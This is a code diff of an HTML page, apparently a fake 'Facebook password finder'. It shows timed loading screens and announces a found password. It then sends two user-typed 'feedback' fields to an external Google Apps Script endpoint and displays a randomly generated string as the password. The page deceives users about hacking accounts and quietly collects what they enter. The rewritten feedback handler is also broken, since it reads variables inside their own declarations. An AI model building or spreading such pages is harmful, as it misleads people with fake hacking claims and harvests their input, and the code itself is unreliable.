@@ -7,14 +7,17 @@
 
 <style>
 html,body{
-  margin:0; height:100%; background:#000; color:#0f0;
-  font-family:monospace; overflow:hidden;
+  margin:0;height:100%;
+  background:#000;color:#0f0;
+  font-family:monospace;overflow:hidden;
 }
-.hidden{display:none}
 .center{
-  display:flex; flex-direction:column;
-  justify-content:center; align-items:center;
-  height:100vh; text-align:center;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  text-align:center;
 }
 
 /* ---------- LOADING ---------- */
@@ -35,162 +38,118 @@ input,select,button{
   border:2px solid #0f0;
   font-size:16px;
 }
-button:hover{
-  background:#0f0;color:#000;
-  cursor:pointer;
-}
+button:hover{background:#0f0;color:#000;cursor:pointer}
 .glow{
   text-shadow:0 0 10px #0f0,0 0 30px #0f0;
   animation:glow 1s alternate infinite;
 }
-@keyframes glow{
-  from{opacity:.6}
-  to{opacity:1}
-}
+@keyframes glow{from{opacity:.6}to{opacity:1}}
 </style>
 </head>
 
 <body>
 
-<!-- INTRO LOADING -->
+<!-- INTRO -->
 <div id="intro" class="center">
   <div id="loader"></div>
   <div id="percent" class="glow">0%</div>
 </div>
 
-<!-- SEARCH FORM -->
-<div id="form" class="center hidden">
+<!-- FORM -->
+<div id="form" class="center" style="display:none">
   <h1 class="glow">ACCOUNT SEARCH SIMULATION</h1>
-
   <input placeholder="NAME" id="name">
   <input placeholder="FRIENDS" id="friends">
-
-  <select id="pro">
-    <option>PRO MODE: ON</option>
-    <option>PRO MODE: OFF</option>
-  </select>
-
-  <select id="lock">
-    <option>PROFILE: LOCK</option>
-    <option>PROFILE: NO</option>
-  </select>
-
-  <select id="friend">
-    <option>FRIEND: YES</option>
-    <option>FRIEND: NO</option>
-  </select>
-
-  <select id="bio">
-    <option>BIO: YES</option>
-    <option>BIO: NO</option>
-  </select>
-
-  <select id="kind">
-    <option>PAGE</option>
-    <option>NORMAL FACEBOOK</option>
-  </select>
-
-  <button onclick="startSearch()">FIND</button>
+  <select id="pro"><option>PRO MODE: ON</option><option>PRO MODE: OFF</option></select>
+  <select id="lock"><option>PROFILE: LOCK</option><option>PROFILE: NO</option></select>
+  <select id="friend"><option>FRIEND: YES</option><option>FRIEND: NO</option></select>
+  <select id="bio"><option>BIO: YES</option><option>BIO: NO</option></select>
+  <select id="kind"><option>PAGE</option><option>NORMAL FACEBOOK</option></select>
+  <button id="findBtn">FIND</button>
 </div>
 
 <!-- SEARCHING -->
-<div id="searching" class="center hidden">
+<div id="searching" class="center" style="display:none">
   <h1 class="glow">Searching Account...</h1>
 </div>
 
 <!-- FOUND -->
-<div id="found" class="center hidden">
+<div id="found" class="center" style="display:none">
   <h1 class="glow">PASSWORD FOUND</h1>
   <p>SUCCESSFULLY</p>
-  <button onclick="goFeedback()">GET PASSWORD</button>
+  <button id="getPass">GET PASSWORD</button>
 </div>
 
 <!-- FEEDBACK -->
-<div id="feedback" class="center hidden">
+<div id="feedback" class="center" style="display:none">
   <h2>FEEDBACK</h2>
   <input id="f1" placeholder="Feedback 1">
   <input id="f2" placeholder="Feedback 2">
-  <button onclick="submitFeedback()">SUBMIT</button>
+  <button id="submitFb">SUBMIT</button>
 </div>
 
 <!-- PASSWORD -->
-<div id="passwordPage" class="center hidden">
+<div id="passwordPage" class="center" style="display:none">
   <h2>HERE PASSWORD</h2>
   <h1 id="password" class="glow"></h1>
   <button onclick="location.reload()">BACK TO MAIN</button>
 </div>
 
 <script>
-/* ====== CONFIG ====== */
-const webAppUrl = "https://script.google.com/macros/s/AKfycbz-HYMjDrY0_3XDRP3ZHnki6z1KPi83s8hSFxf5Ar5JyUL54n6CO_-I5UsdJMGpo-NM/exec";
+document.addEventListener("DOMContentLoaded", ()=>{
 
-/* ====== INTRO LOADING (FIXED) ====== */
-const percent = document.getElementById("percent");
-const introDiv = document.getElementById("intro");
-const formDiv = document.getElementById("form");
+  const webAppUrl="https://script.google.com/macros/s/AKfycbwj7L4cgHlDOVPgaOpFhS9XRf98LDUwlClBOlj5-qCFYJHp-QOiGHf7VKo-xWThwRNy/exec";
 
-const INTRO_DURATION = 23000; // 23 seconds
-let startTime = null;
+  const intro=document.getElementById("intro");
+  const form=document.getElementById("form");
+  const percent=document.getElementById("percent");
 
-function introLoop(timestamp){
-  if(!startTime) startTime = timestamp;
-  const elapsed = timestamp - startTime;
-  const progress = Math.min(elapsed / INTRO_DURATION, 1);
+  /* ---------- INTRO LOADING ---------- */
+  let p=0;
+  const introTimer=setInterval(()=>{
+    p++;
+    percent.textContent=p+"%";
+    if(p>=100){
+      clearInterval(introTimer);
+      intro.style.display="none";
+      form.style.display="flex";
+    }
+  },230); // 23 seconds
 
-  percent.textContent = Math.floor(progress * 100) + "%";
+  /* ---------- SEARCH ---------- */
+  document.getElementById("findBtn").onclick=()=>{
+    form.style.display="none";
+    searching.style.display="flex";
+    setTimeout(()=>{
+      searching.style.display="none";
+      found.style.display="flex";
+    },25000);
+  };
 
-  if(progress < 1){
-    requestAnimationFrame(introLoop);
-  } else {
-    introDiv.classList.add("hidden");
-    formDiv.classList.remove("hidden");
-  }
-}
+  /* ---------- FEEDBACK ---------- */
+  document.getElementById("getPass").onclick=()=>{
+    found.style.display="none";
+    feedback.style.display="flex";
+  };
 
-requestAnimationFrame(introLoop);
+  document.getElementById("submitFb").onclick=async()=>{
+    const f1=f1.value;
+    const f2=f2.value;
 
-/* ====== SEARCH ====== */
-function startSearch(){
-  formDiv.classList.add("hidden");
-  document.getElementById("searching").classList.remove("hidden");
+    try{
+      await fetch(webAppUrl,{
+        method:"POST",
+        body:JSON.stringify({type:"feedback",input1:f1,input2:f2})
+      });
+    }catch(e){}
 
-  setTimeout(()=>{
-    document.getElementById("searching").classList.add("hidden");
-    document.getElementById("found").classList.remove("hidden");
-  },25000);
-}
+    feedback.style.display="none";
+    password.textContent=
+      Math.floor(10000+Math.random()*90000)+"ABCDEFGHIJKLMNOPQRSTUVWXYZ"[Math.floor(Math.random()*26)];
+    passwordPage.style.display="flex";
+  };
 
-/* ====== FEEDBACK ====== */
-function goFeedback(){
-  document.getElementById("found").classList.add("hidden");
-  document.getElementById("feedback").classList.remove("hidden");
-}
-
-function randPass(){
-  const letters="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-  return Math.floor(10000+Math.random()*90000)
-    + letters[Math.floor(Math.random()*26)];
-}
-
-async function submitFeedback(){
-  const f1=document.getElementById("f1").value;
-  const f2=document.getElementById("f2").value;
-
-  try{
-    await fetch(webAppUrl,{
-      method:"POST",
-      body:JSON.stringify({
-        type:"feedback",
-        input1:f1,
-        input2:f2
-      })
-    });
-  }catch(e){}
-
-  document.getElementById("feedback").classList.add("hidden");
-  document.getElementById("password").textContent = randPass();
-  document.getElementById("passwordPage").classList.remove("hidden");
-}
+});
 </script>
 
 </body>
